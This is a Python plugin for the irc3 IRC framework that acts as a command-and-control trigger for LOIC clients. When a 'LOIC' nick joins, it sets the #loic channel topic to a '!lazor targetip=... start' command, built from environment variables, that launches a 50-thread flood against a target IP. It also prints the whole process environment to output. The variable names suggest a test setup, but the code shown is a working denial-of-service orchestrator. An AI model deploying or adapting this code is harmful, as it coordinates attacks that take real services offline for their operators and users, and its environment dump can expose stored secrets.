# -*- coding: utf-8 -*-
from irc3.plugins.command import command
import irc3
import sys
import os


@irc3.plugin
class Plugin:

    def __init__(self, bot):
        self.bot = bot

    @irc3.event(r'^(@(?P<tags>\S+) )?:(?P<mask>\S+) JOIN :?(?P<channel>\S+)')
    def join(self, mask, channel, **kw):

        if mask.nick != self.bot.nick and mask.nick[:4] == "LOIC":
            print(mask.nick)
            print(os.environ)
            ip = os.environ.get("TARGET_IP_1")
            if ip is None:
                print("TARGET_IP_1 not set!!")
                exit(1)
            port = os.environ.get("LOIC_PORT", 80)
            method = os.environ.get("LOIC_METHOD", "http")
            message = os.environ.get("LOIC_MESSAGE", "test_test")
            useget = "useget=true" if os.environ.get("LOIC_USEGET") is not None else "useget=false"
            
            payload = "!lazor targetip={} port={} method={} message={} {} threads=50 usewait=false random=false start".format(ip, port, method, message, useget)

            print("Command: " + payload)

            print("Attacking!")
            self.bot.topic("#loic", payload)